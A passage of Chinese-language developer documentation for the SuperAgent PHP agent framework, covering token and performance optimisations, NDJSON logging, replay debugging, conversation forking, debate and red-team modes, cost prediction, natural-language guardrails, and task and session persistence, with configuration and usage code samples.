SuperAgent v0.7.0 引入了两个优化层，集成到 `QueryEngine` 流水线中：

- **Token 优化** (`src/Optimization/`) — 5 种策略，减少 API 输入/输出 Token
- **执行性能** (`src/Performance/`) — 8 种策略，加速运行时执行

所有优化在 `QueryEngine` 构造函数中通过 `fromConfig()` 自动初始化，并在 `callProvider()` 和 `executeTools()` 中透明应用。每项优化均可通过环境变量独立禁用。

### 配置

```php
// config/superagent.php

'optimization' => [
    'tool_result_compaction' => [
        'enabled' => env('SUPERAGENT_OPT_TOOL_COMPACTION', true),
        'preserve_recent_turns' => 2,   // 保留最近 N 轮完整内容
        'max_result_length' => 200,     // 压缩后结果最大字符数
    ],
    'selective_tool_schema' => [
        'enabled' => env('SUPERAGENT_OPT_SELECTIVE_TOOLS', true),
        'max_tools' => 20,              // 每次请求最多包含的工具数
    ],
    'model_routing' => [
        'enabled' => env('SUPERAGENT_OPT_MODEL_ROUTING', true),
        'fast_model' => env('SUPERAGENT_OPT_FAST_MODEL', 'claude-haiku-4-5-20251001'),
        'min_turns_before_downgrade' => 2,
    ],
    'response_prefill' => [
        'enabled' => env('SUPERAGENT_OPT_RESPONSE_PREFILL', true),
    ],
    'prompt_cache_pinning' => [
        'enabled' => env('SUPERAGENT_OPT_CACHE_PINNING', true),
        'min_static_length' => 500,
    ],
],

'performance' => [
    'parallel_tool_execution' => [
        'enabled' => env('SUPERAGENT_PERF_PARALLEL_TOOLS', true),
        'max_parallel' => 5,
    ],
    'streaming_tool_dispatch' => [
        'enabled' => env('SUPERAGENT_PERF_STREAMING_DISPATCH', true),
    ],
    'connection_pool' => [
        'enabled' => env('SUPERAGENT_PERF_CONNECTION_POOL', true),
    ],
    'speculative_prefetch' => [
        'enabled' => env('SUPERAGENT_PERF_SPECULATIVE_PREFETCH', true),
        'max_cache_entries' => 50,
        'max_file_size' => 100000,
    ],
    'streaming_bash' => [
        'enabled' => env('SUPERAGENT_PERF_STREAMING_BASH', true),
        'max_output_lines' => 500,
        'tail_lines' => 100,
        'stream_timeout_ms' => 30000,
    ],
    'adaptive_max_tokens' => [
        'enabled' => env('SUPERAGENT_PERF_ADAPTIVE_TOKENS', true),
        'tool_call_tokens' => 2048,
        'reasoning_tokens' => 8192,
    ],
    'batch_api' => [
        'enabled' => env('SUPERAGENT_PERF_BATCH_API', false),  // 默认禁用
        'max_batch_size' => 100,
    ],
    'local_tool_zero_copy' => [
        'enabled' => env('SUPERAGENT_PERF_ZERO_COPY', true),
        'max_cache_size_mb' => 50,
    ],
],
```

### Token 优化

#### 工具结果压缩 (`ToolResultCompactor`)

将旧的工具结果替换为简洁摘要。超过最近 N 轮的结果会被压缩为 `"[Compacted] Read: <?php class Agent..."`。错误结果保持原样不被压缩。

```php
use SuperAgent\Optimization\ToolResultCompactor;

$compactor = new ToolResultCompactor(
    enabled: true,
    preserveRecentTurns: 2,
    maxResultLength: 200,
);

// 压缩消息数组（返回新数组，原始数据不变）
$compacted = $compactor->compact($messages);
```

**效果**：多轮对话中输入 Token 减少 30-50%。

#### 按需工具 Schema (`ToolSchemaFilter`)

每轮只发送相关的工具 Schema，而非全部 59 个。根据最近的工具使用情况检测当前任务阶段：

| 阶段 | 检测条件 | 包含的工具 |
|------|---------|-----------|
| 探索 | 上次工具为 Read/Grep/Glob/WebSearch | read, grep, glob, bash, web_search, web_fetch |
| 编辑 | 上次工具为 Edit/Write | read, write, edit, bash, grep, glob |
| 规划 | 上次工具为 Agent/PlanMode | read, grep, glob, agent, enter_plan_mode, exit_plan_mode |
| 首轮 | 无工具历史 | 所有工具（不过滤） |

始终包含 `read` 和 `bash`。同时包含最近 2 轮中使用过的工具。最少 5 个工具阈值 — 如果过滤过于激进，则所有工具全部通过。

**效果**：每次请求节省约 10K Token。

#### 按轮模型路由 (`ModelRouter`)

纯工具调用轮（无文本，仅 tool_use 块）自动降级到更便宜的模型，当模型产生大量文本时自动升级回来。

```php
use SuperAgent\Optimization\ModelRouter;

$router = ModelRouter::fromConfig('claude-sonnet-4-6-20250627');

// 返回快速模型或 null（使用主模型）
$model = $router->route($messages, $turnCount);

// 每轮结束后记录是否为纯工具调用轮
$router->recordTurn($assistantMessage);
```

路由逻辑：
1. 前 N 轮（默认 2）：始终使用主模型
2. 连续 2+ 轮纯工具调用后：降级到快速模型
3. 快速模型产生文本时：自动升级回主模型
4. 如果主模型已是廉价模型（启发式：名称包含 "haiku"），则不降级

**效果**：成本降低 40-60%。

#### 响应预填充 (`ResponsePrefill`)

利用 Anthropic 的 assistant 预填充功能，在长工具调用序列后引导输出。连续 3+ 轮工具往返后，预填充 `"I'll"` 以鼓励总结而非继续调用工具。保守策略：首轮、工具结果之后或活跃探索期间不预填充。

#### 提示缓存固定 (`PromptCachePinning`)

在系统提示中自动插入缓存边界标记。`AnthropicProvider` 在边界处分割提示：之前的静态内容设置 `cache_control: ephemeral`，之后的动态内容不设置。这实现了提示缓存：静态前缀在各轮之间保持缓存。

分割点检测启发式：
- 查找动态区段标记：`# Current`、`# Context`、`# Memory`、`# Session`、`# Recent`、`# Task`
- 如果未找到标记，则回退到 80% 位置

**效果**：提示缓存命中率约 90%。

### 执行性能

#### 并行工具执行 (`ParallelToolExecutor`)

当 LLM 在一轮中返回多个 tool_use 块时，只读工具使用 PHP Fibers 并行执行。

```php
use SuperAgent\Performance\ParallelToolExecutor;

$executor = ParallelToolExecutor::fromConfig();
$classified = $executor->classify($toolBlocks);
// $classified = ['parallel' => [...只读...], 'sequential' => [...写入...]]

$results = $executor->executeParallel($classified['parallel'], function ($block) {
    return $this->executeSingleTool($block);
});
```

只读（并行安全）：`read`、`grep`、`glob`、`web_search`、`web_fetch`、`tool_search`、`task_list`、`task_get`

**效果**：多工具轮执行时间：max(t1,t2,t3) 而非 sum(t1+t2+t3)。

#### 流式工具分发 (`StreamingToolDispatch`)

在 SSE 流中只读工具的 tool_use 块完成后立即预执行，无需等待 LLM 完整响应结束。

#### 连接池 (`ConnectionPool`)

每个基础 URL 共享 Guzzle 客户端，支持 cURL keep-alive、TCP_NODELAY 和 TCP_KEEPALIVE。消除重复的 TCP/TLS 握手。

```php
use SuperAgent\Performance\ConnectionPool;

$pool = ConnectionPool::fromConfig();
$client = $pool->getClient('https://api.anthropic.com/', [
    'x-api-key' => $apiKey,
    'anthropic-version' => '2023-06-01',
]);
```

#### 推测性预读 (`SpeculativePrefetch`)

Read 工具执行后，预测并预读相关文件到内存缓存中：
- 源文件 → 测试文件（`tests/Unit/BarTest.php`、`tests/Feature/BarTest.php`）
- 测试文件 → 源文件
- PHP 类 → 同目录下的接口
- 同目录下名称前缀相似的文件

每次读取最多 5 个预测，LRU 缓存 50 个条目。

#### 流式 Bash 执行器 (`StreamingBashExecutor`)

流式传输 Bash 输出，支持超时截断。长输出返回最后 N 行 + 摘要头。

```php
use SuperAgent\Performance\StreamingBashExecutor;

$bash = StreamingBashExecutor::fromConfig();
$result = $bash->execute('npm test', '/path/to/project');
// $result = ['output' => '...', 'exit_code' => 0, 'truncated' => true, 'total_lines' => 1500]
```

#### 自适应 max_tokens (`AdaptiveMaxTokens`)

根据预期响应类型动态调整每轮的 `max_tokens`：

| 场景 | max_tokens |
|------|-----------|
| 首轮 | 8192 |
| 纯工具调用轮（无文本） | 2048 |
| 推理/文本轮 | 8192 |

#### 批量 API (`BatchApiClient`)

将非实时请求排队到 Anthropic 的 Message Batches API（成本降低 50%）。

```php
use SuperAgent\Performance\BatchApiClient;

$batch = BatchApiClient::fromConfig();
$batch->queue('task-1', $requestBody1);
$batch->queue('task-2', $requestBody2);

$results = $batch->submitAndWait(timeoutSeconds: 300);
// $results = ['task-1' => [...], 'task-2' => [...]]
```

**注意**：默认禁用。通过 `SUPERAGENT_PERF_BATCH_API=true` 启用。

#### 本地工具零拷贝 (`LocalToolZeroCopy`)

Read/Edit/Write 工具之间的文件内容缓存。Read 结果缓存在内存中，Edit/Write 使缓存失效。使用 md5 完整性校验检测外部修改。

```php
use SuperAgent\Performance\LocalToolZeroCopy;

$zc = LocalToolZeroCopy::fromConfig();
$zc->cacheFile('/src/Agent.php', $content);

// 下次 Read：先检查缓存
$cached = $zc->getCachedFile('/src/Agent.php');

// Edit/Write 之后：使缓存失效
$zc->invalidateFile('/src/Agent.php');
```

### 禁用所有优化

```env
# Token 优化
SUPERAGENT_OPT_TOOL_COMPACTION=false
SUPERAGENT_OPT_SELECTIVE_TOOLS=false
SUPERAGENT_OPT_MODEL_ROUTING=false
SUPERAGENT_OPT_RESPONSE_PREFILL=false
SUPERAGENT_OPT_CACHE_PINNING=false

# 执行性能
SUPERAGENT_PERF_PARALLEL_TOOLS=false
SUPERAGENT_PERF_STREAMING_DISPATCH=false
SUPERAGENT_PERF_CONNECTION_POOL=false
SUPERAGENT_PERF_SPECULATIVE_PREFETCH=false
SUPERAGENT_PERF_STREAMING_BASH=false
SUPERAGENT_PERF_ADAPTIVE_TOKENS=false
SUPERAGENT_PERF_BATCH_API=false
SUPERAGENT_PERF_ZERO_COPY=false
```

### 故障排除

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| 模型路由产生错误 | 快速模型无法处理复杂工具 | 设置 `SUPERAGENT_OPT_MODEL_ROUTING=false` 或增加 `min_turns_before_downgrade` |
| 工具结果被过度压缩 | 旧结果中的重要上下文丢失 | 增加 `preserve_recent_turns` 或 `max_result_length` |
| 按需工具移除了所需工具 | 阶段检测误分类 | 最近 2 轮使用的工具始终包含；增加 `max_tools` |
| 并行执行导致文件冲突 | 写入工具被错误分类为只读 | 请报告 Bug — 仅 `read`、`grep`、`glob`、`web_search`、`web_fetch`、`tool_search`、`task_list`、`task_get` 是并行安全的 |
| 预读缓存过大 | 缓存文件过多 | 减少 `max_cache_entries` 或 `max_file_size` |
| 批量 API 超时 | 大批量处理耗时过长 | 增加 `submitAndWait()` 的超时时间或减小批量大小 |

---

## 25. NDJSON 结构化日志

> 兼容 Claude Code 的 NDJSON（换行分隔 JSON）日志，用于实时进程监控。发出与 CC 的 `stream-json` 输出相同的事件格式。

### 概述

SuperAgent 可以 NDJSON 格式写入结构化执行日志 — 每行一个 JSON 对象，匹配 Claude Code 的 `stream-json` 协议。这实现了：

- **进程监控可见性**：CC 的 bridge/sessionRunner 等工具可以解析日志并显示实时工具活动
- **调试**：包含工具调用、结果和 Token 用量的完整执行记录
- **回放**：日志文件可被回放以重建执行流程

两个组件：
- **`NdjsonWriter`** — 底层写入器，格式化并发出单个 NDJSON 事件
- **`NdjsonStreamingHandler`** — 工厂类，创建连接到 `NdjsonWriter` 的 `StreamingHandler`

### 事件类型

| 类型 | 角色 | 说明 |
|------|------|------|
| `assistant` | assistant | LLM 响应，包含文本和/或 tool_use 内容块 + 每轮用量 |
| `user` | user | 工具结果，设置了 `parent_tool_use_id` |
| `result` | — | 最终执行结果（成功或错误） |

### 用法

#### 快速：使用 StreamingHandler 工厂的一行代码

```php
use SuperAgent\Logging\NdjsonStreamingHandler;

// 创建将 NDJSON 写入日志文件的处理器
$handler = NdjsonStreamingHandler::create(
    logTarget: '/tmp/agent-execution.jsonl',
    agentId: 'my-agent',
);

$result = $agent->prompt('Fix the bug in UserController', $handler);
```

#### 完整：包含结果/错误事件

```php
use SuperAgent\Logging\NdjsonStreamingHandler;

$pair = NdjsonStreamingHandler::createWithWriter(
    logTarget: '/tmp/agent.jsonl',
    agentId: 'task-123',
    onText: function (string $delta, string $full) {
        echo $delta;  // 将文本流式输出到终端
    },
);

try {
    $result = $agent->prompt($prompt, $pair->handler);

    $pair->writer->writeResult(
        numTurns: $result->turns(),
        resultText: $result->text(),
        usage: $result->totalUsage()->toArray(),
        costUsd: $result->totalCostUsd,
    );
} catch (\Throwable $e) {
    $pair->writer->writeError($e->getMessage());
    throw $e;
}
```

#### 底层：直接使用 NdjsonWriter

```php
use SuperAgent\Logging\NdjsonWriter;

$writer = new NdjsonWriter(
    agentId: 'agent-1',
    sessionId: 'session-abc',
    stream: fopen('/tmp/log.jsonl', 'a'),
);

// 写入单个事件
$writer->writeToolUse('Read', 'tu_001', ['file_path' => '/src/Agent.php']);
$writer->writeToolResult('tu_001', 'Read', '<?php class Agent { ... }', false);
$writer->writeAssistant($assistantMessage);
$writer->writeResult(3, 'Task completed.', ['input_tokens' => 5000, 'output_tokens' => 1200]);
```

### NDJSON 格式参考

#### Assistant 事件 (tool_use)
```json
{"type":"assistant","message":{"role":"assistant","content":[{"type":"tool_use","id":"tu_001","name":"Read","input":{"file_path":"/src/Agent.php"}}]},"usage":{"inputTokens":1500,"outputTokens":200,"cacheReadInputTokens":0,"cacheCreationInputTokens":0},"session_id":"agent-1","uuid":"a1b2c3d4-...","parent_tool_use_id":null}
```

#### User 事件 (tool_result)
```json
{"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"tu_001","content":"<?php class Agent { ... }"}]},"parent_tool_use_id":"tu_001","session_id":"agent-1","uuid":"e5f6g7h8-..."}
```

#### Result 事件（成功）
```json
{"type":"result","subtype":"success","duration_ms":12345,"duration_api_ms":12345,"is_error":false,"num_turns":3,"result":"Task completed.","total_cost_usd":0.005,"usage":{"inputTokens":5000,"outputTokens":1200,"cacheReadInputTokens":800,"cacheCreationInputTokens":0},"session_id":"agent-1","uuid":"i9j0k1l2-..."}
```

#### Result 事件（错误）
```json
{"type":"result","subtype":"error_during_execution","duration_ms":500,"is_error":true,"num_turns":0,"errors":["Connection refused"],"session_id":"agent-1","uuid":"m3n4o5p6-..."}
```

### 子进程集成

子 Agent 进程（`agent-runner.php`）自动在 stderr 上发出 NDJSON。父进程的 `ProcessBackend::poll()` 检测 JSON 行（以 `{` 开头）并将其排队为进度事件。`AgentTool::applyProgressEvents()` 同时解析 CC NDJSON 格式和旧版 `__PROGRESS__:` 格式以保持向后兼容。

### API 参考

#### `NdjsonWriter`

| 方法 | 说明 |
|------|------|
| `writeAssistant(AssistantMessage, ?parentToolUseId)` | 发出包含内容块 + 用量的 assistant 消息 |
| `writeToolUse(toolName, toolUseId, input)` | 发出单个 tool_use 作为 assistant 消息 |
| `writeToolResult(toolUseId, toolName, result, isError)` | 发出工具结果作为 user 消息 |
| `writeResult(numTurns, resultText, usage, costUsd)` | 发出成功结果 |
| `writeError(error, subtype)` | 发出错误结果 |

#### `NdjsonStreamingHandler`

| 方法 | 说明 |
|------|------|
| `create(logTarget, agentId, append, onText, onThinking)` | 返回 `StreamingHandler` |
| `createWithWriter(logTarget, agentId, append, onText, onThinking)` | 返回 `{handler, writer}` 对 |

### 故障排除

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| 日志文件为空 | 处理器未传递给 `$agent->prompt()` | 确保处理器是第二个参数 |
| 日志中无工具事件 | 仅注册了 `onText` | 使用 `NdjsonStreamingHandler::create()` 来注册所有回调 |
| 进程监控无活动显示 | 解析器期望 NDJSON 但收到纯文本 | 验证子进程使用 `NdjsonWriter`（v0.6.18+） |
| Unicode 导致 NDJSON 解析器中断 | 内容中包含 U+2028/U+2029 | `NdjsonWriter` 会自动转义这些字符 |

---

## 26. Agent Replay 时间旅行调试

> 记录完整的执行轨迹并逐步回放，用于调试复杂的多Agent交互。支持在任意步骤检查Agent状态、搜索事件、从任意步骤分叉、带累计成本的时间线可视化。

### 概述

Replay系统在Agent执行期间捕获每个重要事件——LLM调用、工具调用、Agent生成、Agent间消息和周期性状态快照——形成不可变的 `ReplayTrace`。`ReplayPlayer` 允许你在轨迹中前进/后退导航、检查单个Agent、从任意步骤分叉以探索不同路径。

核心类：

| 类 | 职责 |
|---|---|
| `ReplayRecorder` | 执行期间记录事件 |
| `ReplayTrace` | 包含事件和元数据的不可变轨迹 |
| `ReplayEvent` | 单个事件（5种类型：llm_call、tool_call、agent_spawn、agent_message、state_snapshot） |
| `ReplayPlayer` | 逐步导航、检查、搜索、分叉 |
| `ReplayState` | 特定步骤的重建状态 |
| `ReplayStore` | NDJSON持久化，支持列表/清理/删除 |

### 配置

```php
'replay' => [
    'enabled' => env('SUPERAGENT_REPLAY_ENABLED', false),
    'storage_path' => env('SUPERAGENT_REPLAY_STORAGE_PATH', null),
    'snapshot_interval' => (int) env('SUPERAGENT_REPLAY_SNAPSHOT_INTERVAL', 5),
    'max_age_days' => (int) env('SUPERAGENT_REPLAY_MAX_AGE_DAYS', 30),
],
```

### 使用

```php
use SuperAgent\Replay\ReplayRecorder;
use SuperAgent\Replay\ReplayPlayer;
use SuperAgent\Replay\ReplayStore;

// 记录执行轨迹
$recorder = new ReplayRecorder('session-123', snapshotInterval: 5);
$recorder->recordLlmCall('main', 'claude-sonnet-4-6', $messages, $response, $usage, $durationMs);
$recorder->recordToolCall('main', 'read', $toolId, $input, $output, $durationMs);
$recorder->recordAgentSpawn('child-1', 'main', 'researcher', $config);
$trace = $recorder->finalize();

// 加载并回放
$store = new ReplayStore(storage_path('superagent/replays'));
$store->save($trace);
$trace = $store->load('session-123');

$player = new ReplayPlayer($trace);
$state = $player->stepTo(15);       // 跳到第15步
$info = $player->inspect('child-1'); // 检查子Agent状态
$results = $player->search('bash');  // 搜索事件
$timeline = $player->getTimeline();  // 格式化时间线
$forked = $player->fork(10);        // 从第10步分叉
```

### 故障排除

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| 轨迹文件过大 | 长时间运行的会话 | 增大 `snapshot_interval` 以减少快照频率 |
| 回放中缺少事件 | Recorder未接入 | 确保 `ReplayRecorder` 连接到 QueryEngine |

---

## 27. 对话分叉

> 在对话任意节点分叉，并行探索多种方案，使用内置或自定义评分策略自动选择最优结果。

### 概述

对话分叉允许你获取对话快照，创建N个不同提示或策略的分支，通过 `proc_open` 全部并行执行，然后选择最优结果。适用于：比较设计方案、A/B测试提示词、在预算约束下探索解决方案变体。

核心类：

| 类 | 职责 |
|---|---|
| `ForkManager` | 创建和执行分叉的高级API |
| `ForkSession` | 包含基础消息和分支的分叉会话 |
| `ForkBranch` | 单个分支，含提示词、状态、结果、评分 |
| `ForkExecutor` | 通过 `proc_open` 并行执行 |
| `ForkResult` | 聚合结果，支持评分和排名 |
| `ForkScorer` | 内置评分策略 |

### 配置

```php
'fork' => [
    'enabled' => env('SUPERAGENT_FORK_ENABLED', false),
    'default_timeout' => (int) env('SUPERAGENT_FORK_TIMEOUT', 300),
    'max_branches' => (int) env('SUPERAGENT_FORK_MAX_BRANCHES', 5),
],
```

### 使用

```php
use SuperAgent\Fork\ForkManager;
use SuperAgent\Fork\ForkExecutor;
use SuperAgent\Fork\ForkScorer;

$manager = new ForkManager(new ForkExecutor());

// 不同方案分叉
$session = $manager->forkWithVariants(
    messages: $agent->getMessages(),
    turnCount: $currentTurn,
    prompts: ['使用策略模式重构', '使用命令模式重构', '使用简单函数提取重构'],
);

$result = $manager->execute($session);

// 组合评分：70%成本效率 + 30%简洁度
$scorer = ForkScorer::composite(
    [[ForkScorer::class, 'costEfficiency'], [ForkScorer::class, 'brevity']],
    [0.7, 0.3],
);
$best = $result->getBest($scorer);
```

### 故障排除

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| 所有分支失败 | 找不到 `agent-runner.php` | 验证 `bin/agent-runner.php` 存在且可执行 |
| 分支超时 | 复杂任务+短超时 | 增加 `fork.default_timeout` |

---

## 28. Agent 辩论协议

> 三种结构化多Agent协作模式——辩论、红队和集成——通过对抗性或独立-合并方法提升输出质量。

### 概述

辩论协议超越简单的并行执行，引入Agent之间的结构化交互模式：

1. **辩论**：提议者提出方案，批评者寻找缺陷，裁判综合最佳方案。多轮进行，含反驳环节。
2. **红队**：构建者创建解决方案，攻击者系统性地发现漏洞（安全、边界情况、性能），审查者产出最终评估。
3. **集成**：N个Agent用可能不同的模型独立解决同一问题，然后合并器将各方案的最优元素结合起来。

### 配置

```php
'debate' => [
    'enabled' => env('SUPERAGENT_DEBATE_ENABLED', false),
    'default_rounds' => (int) env('SUPERAGENT_DEBATE_ROUNDS', 3),
    'default_max_budget' => (float) env('SUPERAGENT_DEBATE_MAX_BUDGET', 5.0),
],
```

### 使用

```php
use SuperAgent\Debate\DebateOrchestrator;
use SuperAgent\Debate\DebateConfig;
use SuperAgent\Debate\RedTeamConfig;
use SuperAgent\Debate\EnsembleConfig;

$orchestrator = new DebateOrchestrator($agentRunner);

// 结构化辩论
$config = DebateConfig::create()
    ->withProposerModel('opus')->withCriticModel('sonnet')->withJudgeModel('opus')
    ->withRounds(3)->withMaxBudget(5.0)
    ->withJudgingCriteria('评估正确性、可维护性和性能');
$result = $orchestrator->debate($config, '微服务还是单体架构？');

// 红队安全审查
$config = RedTeamConfig::create()
    ->withAttackVectors(['security', 'edge_cases', 'race_conditions'])->withRounds(3);
$result = $orchestrator->redTeam($config, '构建JWT认证系统');

// 集成求解
$config = EnsembleConfig::create()
    ->withAgentCount(3)->withModels(['opus', 'sonnet', 'haiku'])->withMergerModel('opus');
$result = $orchestrator->ensemble($config, '实现滑动窗口限流器');
```

### 故障排除

**辩论成本太高。** 提议者/批评者使用 `sonnet`，仅裁判使用 `opus`。将轮数减到2。设置严格的 `maxBudget`。

---

## 29. 成本预测引擎

> 执行前基于历史数据和提示词复杂度分析估算任务成本。支持跨模型即时比较。

### 概述

成本预测引擎分析提示词以预测token使用量、所需轮次和总成本。三种策略按优先级排列：历史加权平均（置信度可达95%）、类型平均混合（置信度可达70%）、启发式估算（置信度30%）。

### 配置

```php
'cost_prediction' => [
    'enabled' => env('SUPERAGENT_COST_PREDICTION_ENABLED', false),
    'storage_path' => env('SUPERAGENT_COST_PREDICTION_STORAGE_PATH', null),
],
```

### 使用

```php
use SuperAgent\CostPrediction\CostPredictor;
use SuperAgent\CostPrediction\CostHistoryStore;

$predictor = new CostPredictor(new CostHistoryStore(storage_path('superagent/cost_history')));

$estimate = $predictor->estimate('重构所有控制器使用DTO', 'claude-sonnet-4-6');
echo $estimate->format();

if (!$estimate->isWithinBudget(1.00)) {
    $cheaper = $estimate->withModel('haiku');
}

// 多模型成本对比
$comparison = $predictor->compareModels('编写UserService单元测试', ['opus', 'sonnet', 'haiku']);

// 记录实际执行以改善未来预测
$predictor->recordExecution($taskHash, 'sonnet', $actualCost, $actualTokens, $actualTurns, $durationMs);
```

### 故障排除

**预测始终是"启发式"且置信度30%。** 通过 `recordExecution()` 记录实际执行。累积3+条相似任务记录后，预测将切换到"历史"模式。

---

## 30. 自然语言护栏

> 用自然语言定义护栏规则，零成本编译（无LLM调用），通过确定性模式匹配。

### 概述

自然语言护栏让非技术人员无需学习YAML DSL即可定义安全和合规规则。`RuleParser` 使用正则表达式和关键词匹配将自然语言编译为标准护栏条件。支持6种规则类型：

| 规则类型 | 示例 | 编译动作 |
|----------|------|----------|
| 工具限制 | "禁止修改database/migrations中的文件" | deny + tool_input_contains |
| 成本规则 | "成本超过$5时暂停并请求批准" | ask + cost_exceeds |
| 速率限制 | "每分钟最多10次bash调用" | rate_limit + rate条件 |
| 文件限制 | "不要触碰.env文件" | deny + tool_input_contains |
| 警告规则 | "修改config文件时发出警告" | warn + tool_input_contains |
| 内容规则 | "所有生成的代码必须有错误处理" | warn（需审查） |

### 配置

```php
'nl_guardrails' => [
    'enabled' => env('SUPERAGENT_NL_GUARDRAILS_ENABLED', false),
    'rules' => [
        'Never modify files in database/migrations',
        'If cost exceeds $5, pause and ask for approval',
        'Max 10 bash calls per minute',
    ],
],
```

### 使用

```php
use SuperAgent\Guardrails\NaturalLanguage\NLGuardrailFacade;

$compiled = NLGuardrailFacade::create()
    ->rule('Never modify files in database/migrations')
    ->rule('If cost exceeds $5, pause and ask for approval')
    ->rule('Max 10 bash calls per minute')
    ->rule("Don't touch .env files")
    ->compile();

echo "总计: {$compiled->totalRules}, 高置信度: {$compiled->highConfidenceCount}\n";

foreach ($compiled->getNeedsReview() as $rule) {
    echo "需审查: {$rule->originalText} (置信度: {$rule->confidence})\n";
}

$yaml = $compiled->toYaml();
```

### 故障排除

**规则编译后置信度低。** 解析器使用正则模式匹配——请重新措辞以匹配支持的格式。例如 "No bash" → "Block all bash calls"。

---

## 31. 自愈流水线

> Pipeline步骤失败时，自动诊断根因、制定修复计划、应用智能变异并重试——超越简单重试，实现真正的自适应。

### 概述

自愈流水线用智能 `self_heal` 策略替代基本的 `retry` 失败策略。流程为：诊断（规则+LLM分类）→ 制定修复计划 → 应用配置变异 → 重试。系统将失败分为8类，每类映射到相应的修复策略：

| 错误类别 | 修复策略 | 示例 |
|----------|----------|------|
| `timeout` | 增加超时+简化任务 | "连接在60秒后超时" |
| `rate_limit` | 等待+带退避重试 | "429 Too Many Requests" |
| `model_limitation` | 升级模型+简化提示词 | "Token限制超出" |
| `resource_exhaustion` | 简化任务+减少输出 | "内存不足" |
| `external_dependency` | 带退避重试 | "连接被拒绝" |
| `tool_failure` | 修改提示词避开失败工具 | "工具执行错误" |

### 配置

```php
'self_healing' => [
    'enabled' => env('SUPERAGENT_SELF_HEALING_ENABLED', false),
    'max_heal_attempts' => (int) env('SUPERAGENT_SELF_HEALING_MAX_ATTEMPTS', 3),
    'diagnose_model' => env('SUPERAGENT_SELF_HEALING_DIAGNOSE_MODEL', 'sonnet'),
    'max_diagnose_budget' => (float) env('SUPERAGENT_SELF_HEALING_MAX_BUDGET', 0.50),
    'allowed_mutations' => ['modify_prompt', 'change_model', 'adjust_timeout', 'add_context', 'simplify_task'],
],
```

### 使用

```php
use SuperAgent\Pipeline\SelfHealing\SelfHealingStrategy;
use SuperAgent\Pipeline\SelfHealing\StepFailure;

$healer = new SelfHealingStrategy(config: ['max_heal_attempts' => 3]);

$failure = new StepFailure(
    stepName: 'deploy_service', stepType: 'agent',
    stepConfig: ['prompt' => '部署到staging', 'timeout' => 60],
    errorMessage: '连接在60秒后超时', errorClass: 'RuntimeException',
    stackTrace: null, attemptNumber: 1,
);

if ($healer->canHeal($failure)) {
    $result = $healer->heal($failure, function (array $mutatedConfig) {
        return $this->executeStep($mutatedConfig);
    });
    echo $result->wasHealed() ? "已修复: {$result->summary}" : "无法修复: {$result->summary}";
}
```

### 故障排除

**修复器始终失败。** 检查 `allowed_mutations`——如果过于严格，修复器无法做出有意义的更改。至少允许 `modify_prompt` 和 `adjust_timeout`。

**修复成本太高。** 诊断Agent默认使用 `sonnet`。设置 `diagnose_model: haiku` 以降低诊断成本。

---

## 32. 持久化任务管理器

> 基于文件的任务持久化，JSON 索引、每任务输出日志和非阻塞进程监控。

### 概述

`PersistentTaskManager` 继承 `TaskManager`，将任务持久化到磁盘。维护 JSON 索引文件（`tasks.json`）和每任务输出日志文件（`{id}.log`）。重启时 `restoreIndex()` 自动将残留的运行中任务标记为失败。基于天数的 `prune()` 清理已完成任务。

核心类：`SuperAgent\Tasks\PersistentTaskManager`

### 配置

```php
// config/superagent.php
'persistence' => [
    'enabled' => env('SUPERAGENT_PERSISTENCE_ENABLED', false),
    'storage_path' => env('SUPERAGENT_PERSISTENCE_PATH', null),
    'tasks' => [
        'enabled' => true,
        'max_output_read_bytes' => 12000,
        'prune_after_days' => 30,
    ],
],
```

### 使用

```php
use SuperAgent\Tasks\PersistentTaskManager;

$manager = PersistentTaskManager::fromConfig(overrides: ['enabled' => true]);

// 创建任务
$task = $manager->createTask('构建功能 X');

// 流式输出
$manager->appendOutput($task->id, "步骤 1 完成\n");
$manager->appendOutput($task->id, "步骤 2 完成\n");
$output = $manager->readOutput($task->id);

// 监控进程
$manager->watchProcess($task->id, $process, $generation);
$manager->pollProcesses(); // 非阻塞检查所有被监控的进程

// 清理
$manager->prune(days: 30);
```

### 故障排除

**重启后任务丢失。** 确保 `persistence.enabled` 为 `true` 且 `storage_path` 可写。检查启动时是否调用了 `restoreIndex()`。

**输出文件过大。** `readOutput()` 仅返回最后 `max_output_read_bytes`（默认 12KB）。增大此配置值或清理旧任务。

---

## 33. 会话管理器

> 对话快照的保存、加载、列表和删除，支持项目级恢复和自动清理。

### 概述

`SessionManager` 将对话状态（消息、元数据）以 JSON 文件保存到 `~/.superagent/sessions/`。每个会话获得唯一 ID、自动提取的摘要和 CWD 标签，用于项目级过滤。

核心类：`SuperAgent\Session\SessionManager`

### 配置

```php
// config/superagent.php
'persistence' => [
    'sessions' => [
        'enabled' => true,
        'max_sessions' => 50,
        'prune_after_days' => 90,
    ],
],
```

### 使用

```php
use SuperAgent\Session\SessionManager;

$manager = SessionManager::fromConfig();

// 保存当前对话
$sessionId = $manager->save($messages, ['cwd' => getcwd()]);

// 列出会话（可选按 CWD 过滤）
$sessions = $manager->list(cwd: getcwd());

// 加载指定会话
$snapshot = $manager->load($sessionId);

// 恢复当前项目的最新会话
$latest = $manager->loadLatest(cwd: getcwd());

// 删除会话
$manager->delete($sessionId);
```

### 故障排除

**保存后找不到会话。** 检查会话 ID 是否包含路径遍历字符（`../`）。ID 会被自动消毒。

**会话累积过多。** 调整配置中的 `max_sessions` 和 `prune_after_days`。保存时自动执行清理。

---

## 34. StreamEvent 统一事件架构

> 9 种统一事件类型和多监听器分发，用于实时 Agent 监控。

### 概述

StreamEvent 系统提供在 Agent 执行期间发出的统一类型事件层级。`StreamEventEmitter` 支持订阅/取消订阅、多监听器分发和可选的历史记录。`toStreamingHandler()` 桥接适配器无需代码改动即可连接 `QueryEngine`。

### 事件类型

| 事件 | 描述 |
|---|---|
| `TextDeltaEvent` | 模型的增量文本输出 |
| `ThinkingDeltaEvent` | 增量思考/推理输出 |
| `TurnCompleteEvent` | 一个完整轮次（请求 + 响应）完成 |
| `ToolStartedEvent` | 工具执行开始 |
| `ToolCompletedEvent` | 工具执行完成 |
| `CompactionEvent` | 触发了上下文压缩 |
| `StatusEvent` | 一般状态更新 |
| `ErrorEvent` | 发生错误 |
| `AgentCompleteEvent` | Agent 已完成所有工作 |

### 使用

```php
use SuperAgent\Harness\StreamEventEmitter;
use SuperAgent\Harness\TextDeltaEvent;
